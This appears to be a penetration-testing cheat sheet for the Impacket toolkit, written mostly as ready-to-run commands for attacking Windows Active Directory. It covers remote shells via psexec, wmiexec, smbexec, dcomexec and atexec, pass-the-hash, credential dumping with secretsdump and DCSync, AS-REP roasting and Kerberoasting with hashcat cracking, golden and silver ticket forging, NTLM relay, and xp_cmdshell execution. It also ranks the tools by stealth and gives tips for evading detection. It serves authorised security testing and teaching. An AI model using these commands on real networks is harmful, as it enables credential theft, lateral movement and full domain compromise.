---
id: "impacket"
title: "Impacket - Windows Network Protocol Tools"
type: "tool"
category: "network"
subcategory: "active-directory"
tags: ["impacket", "smb", "wmi", "dcom", "secretsdump", "psexec", "kerberos", "ntlm", "lateral-movement", "credential-dumping"]
difficulty: "intermediate"
platforms: ["linux", "macos"]
source_url: "https://github.com/fortra/impacket"
related: ["bloodhound", "netexec"]
updated: "2026-04-14"
---

## Overview

Impacket is a Python collection of modules for working with network protocols (SMB, MSRPC, Kerberos, LDAP, MSSQL). Contains powerful tools for remote code execution, credential dumping, Kerberos attacks, relay attacks, and lateral movement. Essential toolkit for Active Directory penetration testing.

## Installation

```bash
# Pip install
pip3 install impacket

# From source
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Kali Linux (pre-installed)
# Tools available as impacket-* commands
impacket-secretsdump --help

# Or use python3 scripts directly
python3 examples/secretsdump.py --help
```

## Authentication Methods

All Impacket tools support multiple auth methods:
```bash
# Password authentication
TOOL domain/user:password@target

# NTLM hash (pass-the-hash)
TOOL domain/user@target -hashes :NTLM_HASH
TOOL domain/user@target -hashes LM_HASH:NTLM_HASH

# Kerberos authentication
TOOL domain/user@target -k -no-pass
# Requires: export KRB5CCNAME=/path/to/ticket.ccache

# AES key
TOOL domain/user@target -aesKey AES256_KEY

# NULL session
TOOL domain/''@target
```

## Remote Code Execution

### psexec.py (SMB - most common)
```bash
# Interactive shell (creates service, writes binary to disk)
psexec.py domain/user:password@target
psexec.py domain/user@target -hashes :NTLM_HASH

# Execute single command
psexec.py domain/user:password@target "whoami"
psexec.py domain/user:password@target "ipconfig /all"

# With Kerberos
psexec.py domain/user@target -k -no-pass
```

### wmiexec.py (WMI - stealthier)
```bash
# Semi-interactive shell (no service creation, no disk writes)
wmiexec.py domain/user:password@target
wmiexec.py domain/user@target -hashes :NTLM_HASH

# Execute command
wmiexec.py domain/user:password@target "whoami"

# Specify shell
wmiexec.py domain/user:password@target -shell-type powershell
```

### smbexec.py (SMB - no binary on disk)
```bash
# Semi-interactive shell (uses service but no binary upload)
smbexec.py domain/user:password@target
smbexec.py domain/user@target -hashes :NTLM_HASH
```

### dcomexec.py (DCOM - different execution method)
```bash
# Uses DCOM (ShellWindows, ShellBrowserWindow, MMC20)
dcomexec.py domain/user:password@target
dcomexec.py domain/user:password@target -object ShellWindows
dcomexec.py domain/user:password@target -object MMC20
```

### atexec.py (Task Scheduler)
```bash
# Execute via scheduled task
atexec.py domain/user:password@target "whoami"
```

## Credential Dumping

### secretsdump.py (THE credential dumper)
```bash
# Remote dump (SAM, LSA, NTDS via DCSync)
secretsdump.py domain/user:password@target
secretsdump.py domain/user@target -hashes :NTLM_HASH

# DCSync specific user
secretsdump.py domain/user:password@DC_IP -just-dc-user krbtgt
secretsdump.py domain/user:password@DC_IP -just-dc-user Administrator

# DCSync all (full NTDS dump)
secretsdump.py domain/user:password@DC_IP -just-dc

# NTDS only (no SAM/LSA)
secretsdump.py domain/user:password@DC_IP -just-dc-ntlm

# From local files (offline)
secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Using VSS (Volume Shadow Copy)
secretsdump.py domain/user:password@DC_IP -use-vss

# Execution method
secretsdump.py domain/user:password@target -exec-method smbexec
secretsdump.py domain/user:password@target -exec-method wmiexec
secretsdump.py domain/user:password@target -exec-method mmcexec

# Output to file
secretsdump.py domain/user:password@DC_IP -outputfile dc_dump
```

## Kerberos Attacks

### GetNPUsers.py (AS-REP Roasting)
```bash
# Without valid credentials (null session)
GetNPUsers.py domain/ -no-pass -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep_hashes.txt

# With valid credentials (enumerate vulnerable users)
GetNPUsers.py domain/user:password -dc-ip DC_IP -request -format hashcat -outputfile asrep_hashes.txt

# Specific user
GetNPUsers.py domain/targetuser -no-pass -dc-ip DC_IP -format hashcat

# Then crack with hashcat
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### GetUserSPNs.py (Kerberoasting)
```bash
# Enumerate and request service tickets
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request -outputfile kerberoast_hashes.txt

# With hash
GetUserSPNs.py domain/user -hashes :NTLM_HASH -dc-ip DC_IP -request

# Target specific SPN
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request-user svc_account

# Then crack with hashcat
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt
```

### getTGT.py (Request TGT)
```bash
# Get TGT for use with other tools
getTGT.py domain/user:password -dc-ip DC_IP
getTGT.py domain/user -hashes :NTLM_HASH -dc-ip DC_IP

# Use the ticket
export KRB5CCNAME=user.ccache
```

### getST.py (Request Service Ticket)
```bash
# Request service ticket (with delegation abuse)
getST.py domain/user:password -spn cifs/target.domain.local -dc-ip DC_IP -impersonate Administrator
export KRB5CCNAME=Administrator.ccache
```

### ticketer.py (Golden/Silver Tickets)
```bash
# Golden ticket (requires krbtgt hash)
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator

# Silver ticket (requires service account hash)
ticketer.py -nthash SVC_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local Administrator

export KRB5CCNAME=Administrator.ccache
```

## SMB Tools

### smbclient.py (File operations)
```bash
# Interactive SMB client
smbclient.py domain/user:password@target
smbclient.py domain/user@target -hashes :NTLM_HASH

# List shares
smbclient.py domain/user:password@target -list

# Commands inside smbclient:
# shares          - list shares
# use SHARE       - connect to share
# ls              - list files
# cd DIR          - change directory
# get FILE        - download file
# put FILE        - upload file
# cat FILE        - display file
```

### smbserver.py (Host SMB share)
```bash
# Start SMB server (for file transfer)
smbserver.py SHARE /path/to/share

# With authentication
smbserver.py SHARE /path/to/share -username user -password pass

# SMBv2 support
smbserver.py SHARE /path/to/share -smb2support
```

## LDAP / Enumeration

### GetADUsers.py
```bash
# Enumerate AD users
GetADUsers.py domain/user:password -dc-ip DC_IP -all
```

### findDelegation.py
```bash
# Find delegation configurations
findDelegation.py domain/user:password -dc-ip DC_IP
```

### rpcdump.py
```bash
# Enumerate RPC endpoints
rpcdump.py domain/user:password@target
```

### samrdump.py
```bash
# Enumerate users via SAM
samrdump.py domain/user:password@target
```

### lookupsid.py
```bash
# SID brute force / enumeration
lookupsid.py domain/user:password@target
lookupsid.py domain/user:password@target 20000  # range
```

## Relay Attacks

### ntlmrelayx.py
```bash
# Relay NTLM auth to target
ntlmrelayx.py -t smb://target -smb2support

# Relay to LDAP (for ACL abuse)
ntlmrelayx.py -t ldaps://DC_IP --delegate-access

# Relay to multiple targets
ntlmrelayx.py -tf targets.txt -smb2support

# Execute command on relay
ntlmrelayx.py -t smb://target -smb2support -c "whoami"

# Dump SAM on relay
ntlmrelayx.py -t smb://target -smb2support --sam

# With IPv6
ntlmrelayx.py -6 -t smb://target -smb2support
```

### responder integration
```bash
# Run Responder to capture/relay
# Then ntlmrelayx handles the relay
responder -I eth0 -rdw
ntlmrelayx.py -tf targets.txt -smb2support
```

## MSSQL

### mssqlclient.py
```bash
# Connect to MSSQL
mssqlclient.py domain/user:password@target
mssqlclient.py domain/user:password@target -windows-auth

# SQL commands
SQL> SELECT @@version
SQL> SELECT name FROM sys.databases
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

## Quick Reference - Which Tool When

| Goal | Tool | Stealth |
|------|------|---------|
| Interactive shell | psexec.py | Low (service + binary) |
| Stealthy shell | wmiexec.py | High (WMI, no disk) |
| Shell (no binary) | smbexec.py | Medium (service, no binary) |
| DCOM shell | dcomexec.py | Medium |
| Scheduled task exec | atexec.py | Medium |
| Dump all creds | secretsdump.py | - |
| DCSync | secretsdump.py -just-dc | - |
| AS-REP Roast | GetNPUsers.py | High |
| Kerberoast | GetUserSPNs.py | High |
| NTLM Relay | ntlmrelayx.py | - |
| SMB file access | smbclient.py | - |
| Host SMB share | smbserver.py | - |

## Pro Tips

- wmiexec.py is stealthier than psexec.py (no service binary on disk)
- secretsdump.py `-just-dc` does DCSync without touching the filesystem
- Always try pass-the-hash before cracking - it's faster
- GetUserSPNs.py with `-request` gets crackable service tickets
- Use `-exec-method` with secretsdump to control execution method
- smbserver.py is essential for file transfer during engagements
- ntlmrelayx.py to LDAPS can create machine accounts for RBCD attacks
- ticketer.py golden tickets survive password resets (krbtgt key needed)
- Export KRB5CCNAME for all Kerberos-based authentication
- lookupsid.py can enumerate users without valid credentials via null session
